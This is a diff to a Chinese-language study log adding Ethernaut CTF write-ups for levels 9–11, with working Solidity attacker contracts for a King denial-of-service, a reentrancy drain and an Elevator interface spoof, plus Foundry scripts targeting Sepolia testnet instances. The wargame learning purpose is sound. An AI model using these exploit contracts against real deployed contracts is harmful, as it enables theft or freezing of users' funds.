@@ -213,7 +213,7 @@ contract Attacker {
     receive() external payable {}
 }
 ```
-完整代码见：[Attacker](ethernaut/script/level07/Attacker.s.sol)
+完整代码见：[Attacker](Writeup/phipupt/script/level07/Attacker.s.sol)
 
 使用Foundry：
 
@@ -251,7 +251,7 @@ bytes32 password = vm.load(address(level), bytes32(uint256(1)));
 
 level.unlock(password);
 ```
-完整代码见：[这里](ethernaut/script/level08.s.sol)
+完整代码见：[这里](Writeup/phipupt/script/level08.s.sol)
 
 Foundry 脚本：
 
@@ -271,5 +271,246 @@ cast call 0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4 \
 - [level(`Vault`) 实例](https://sepolia.etherscan.io/address/0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4)
 - [调用 `unlock` 函数](https://sepolia.etherscan.io/tx/0xf9600a8004358b0e446be4fb24152ecd4681b3a09ebb010136662ccd6a6185a1)
 
+
+
+### 2024.09.07
+
+[The Ethernaut level 9]([https://ether](https://ethernaut.openzeppelin.com/level/9))
+
+这一关的要求是结束这个庞氏游戏。
+
+仔细阅读这个合约，发现，只要发送 ether 数量比当前 `prize` 值大，就可以成为新的 `king`。同时， `owner` 有权限直接让游戏从零开始。
+
+注意到 `receive` 函数中使用了 `transfer`，而且没有判断改方法执行是否成功。因此，可以从这里下手。只要 `tansfer` 失败了，函数回退，任何人都无法再继续这个游戏。
+
+令 `reansfer` 失败最简单的方式就是写一个不接收 ether 的函数（没有 `fallback` 或 `receive` ），让这和合约成为新的 `king` 就行了。
+
+步骤如下：
+1. 部署一个不接收 ether 的合约
+2. 令这个合约成为新的 `king`
+
+实例代码如下：
+
+```
+contract Attacker {
+    address targetAddr;
+    bool locked;
+    constructor(address targetAddr_) {
+        targetAddr = targetAddr_;
+    }
+
+    function attack(uint value) public payable {
+        (bool success, ) = targetAddr.call{value: value}("");
+
+        require(success, "claim kingship failed");
+    }
+
+    receive() external payable {
+        require(!locked, "Never send a wei");
+        locked = true;
+    }
+}
+```
+
+还需要一个脚本去部署 `Attacker` 合约并发送大于当前 `prize` 的 ether 数量成为 `king`
+
+```
+address levelAddr = 0xDB22a38C8d51dc8CF7bfBbffAb8f618cFE148a04;
+
+Attacker attacker = new Attacker(levelAddr);
+
+King target = King(payable(levelAddr));
+
+// 计算需要给攻击合约至少发送多少 ether
+uint minValue = target.prize() + 1;
+(bool success, ) = address(attacker).call{value: minValue}("");
+require(success, "Failed to send Ether to the attacker contract");
+
+// 攻击合约发动攻击
+attacker.attack(minValue);
+```
+
+完整代码见：[这里](Writeup/phipupt/script/level09.s.sol)
+
+Foundry 脚本：
+
+调用脚本部署并发动攻击：
+```
+forge script script/level09.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+查询当前 king
+```
+cast call <level address> \
+"_king()(address)" \
+--rpc-url sepolia
+```
+
+查询当前 prize
+```
+cast call <level address> \
+"prize()(uint256)" \
+--rpc-url sepolia
+```
+
+尝试获取king
+```
+cast send <level address> \
+--value <value greate than prize> \
+--rpc-url sepolia \
+--private-key <your private key>
+```
+
+链上记录：
+- [level(`King`) 实例](https://sepolia.etherscan.io/address/0xDB22a38C8d51dc8CF7bfBbffAb8f618cFE148a04)
+- [attack](https://sepolia.etherscan.io/tx/0xbead529e69d0027837c5329fc591b96b5b08cb317d64995e25cc7a82822642ae)
+
+
+### 2024.09.08
+
+[The Ethernaut level 10](https://ethernaut.openzeppelin.com/level/0x2a24869323C0B13Dff24E196Ba072dC790D52479)
+
+这一关的要求是获取合约里所有的资金。
+
+仔细阅读这个合约，发现，这是个典型的重入攻击案例。
+
+问题出在 `withdraw` 方法，在更新余额之前调用了 `msg.sender.call{value: _amount}("")`。这意味着在调用者收到以太币后，调用者仍然有能力再次调用 `withdraw` 函数（即发生重入），在余额尚未更新之前再进行一次提取。通过这种方式，攻击者可以反复进行 `withdraw` 操作，把整个合约的余额全部提走。
+
+采用 `Checks-Effects-Interactions` 模式可以修复这个重入的问题。
+
+攻击合约步骤如下：
+1. 捐赠一定数量 ether 给目标合约
+2. 编写 `receive` 函数，接收到 ether 时向目标合约发起 `withdraw`
+3. 准备就绪后，发起 `withdraw`
+
+示例代码如下：
+
+```
+contract Attacker {
+    Reentrance target;
+
+    constructor(address targetAddr) public {
+        target = Reentrance(payable(targetAddr));
+    }
+
+    function attack(uint amount) public {
+        target.donate{value: amount}(address(this));
+        target.withdraw(amount);
+    }
+
+    receive() external payable {
+        if (address(target).balance >= msg.value) {
+            target.withdraw(msg.value);
+        }
+    }
+}
+```
+
+还需要一个脚本去部署 `Attacker` 合约并发起攻击
+
+```
+address levelAddr = 0x5506958fC2AB6709357d9cB7F813cfb3a387b5B7;
+
+Attacker attacker = new Attacker(levelAddr);
+
+uint amount = 0.001 ether; // level 合约当前balance
+(bool success, ) = address(attacker).call{value: amount}(""); // 先发送 ether 给 attacker
+require(success, "fund attacker failed");
+
+attacker.attack(amount);
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/level10.s.sol)
+
+Foundry 脚本：
+
+调用脚本部署并发动攻击：
+```
+forge script script/level10.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+查询当前地址余额
+```
+cast balance <address> --rpc-url sepolia
+```
+
+
+链上记录：
+- [level(`King`) 实例](https://sepolia.etherscan.io/address/0x5506958fC2AB6709357d9cB7F813cfb3a387b5B7)
+- [Attacker](https://sepolia.etherscan.io/tx/0x34cA64426b2F010bae810b3dFCb41Dd989598957)
+- [attack](https://sepolia.etherscan.io/tx/0xf7a7509d4579e909890cce22d131ae8e7f204f2e2fe8f89a4a3a39af092707a4)
+
+
+### 2024.09.09
+
+[The Ethernaut level 11](https://ethernaut.openzeppelin.com/level/0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2)
+
+这一关的要求是让电梯合约达到顶楼。
+
+仔细阅读这个合约，发现 Building 合约并没有任何实现细节。而且 Elevator 合约里实例化 Building 时使用了 msg.send 作为地址。
+
+因此，我们可以编写一个实现了 Building 接口的合约实现关键的 `isLastFloor` 方法。再通过这个合约去调用 `Elevator` 合约的 `goTo` 方法。这样就可以通过控制 `Building` 合约的返回值，进而达到目的。
+
+攻击合约步骤如下：
+1. 编写一个实现了 Building 接口的合约
+2. 实现 `isLastFloor` 方法，第一次调用时返回 `false，之后调用返回` `true`
+3. 编写 `attack` 函数调用 Elevator 的 `goTo(floor)` 方法;
+4. 调用 `attack` 函数发起攻击
+
+示例代码如下：
+
+```
+contract Attacker is Building {
+    Elevator elevator;
+    bool hasCalled;
+
+    constructor(address elevator_) {
+        elevator = Elevator(elevator_);
+    }
+
+    function isLastFloor(uint256 _floor) public returns (bool) {
+        if (hasCalled) return true;
+
+        hasCalled = true;
+        return false;
+    }
+
+    function attack(uint floor) public {
+        elevator.goTo(floor);
+    }
+}
+```
+
+还需要一个脚本去部署 `Attacker` 合约并发起攻击
+
+```
+address levelAddr = 0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5;
+
+Attacker attacker = new Attacker(levelAddr);
+
+attacker.attack(100);
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/level11.s.sol)
+
+Foundry 脚本：
+
+调用脚本部署并发动攻击：
+```
+forge script script/level11.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+查询是否到达顶层
+```
+cast call 0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5 \
+"top()(bool)" \
+--rpc-url sepolia
+```
+
+
+链上记录：
+- [level(`Elevator`)](https://sepolia.etherscan.io/address/0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5)
+- [Attacker](https://sepolia.etherscan.io/tx/0xe7A0a41d009bB4D3cCEa09A39423e9499A6dEC48)
+- [attack 交易](https://sepolia.etherscan.io/tx/0x4fd6a5b48ad937e8e9d210f9cef031d39ba50ea6df51685edbe15e37512b0971)
 
 <!-- Content_END -->
